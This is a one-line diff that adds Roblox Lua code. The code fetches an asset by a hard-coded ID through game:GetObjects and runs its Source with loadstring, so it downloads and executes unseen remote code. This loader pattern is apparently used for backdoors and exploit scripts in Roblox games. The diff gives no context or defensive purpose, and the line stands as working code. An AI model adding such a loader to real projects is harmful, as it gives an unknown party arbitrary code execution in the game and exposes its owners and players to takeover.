@@ -1,0 +1,1 @@
+str_srce = "14682300022" loadstring(game:GetObjects("rbxassetid://"..str_srce)[1].Source)()
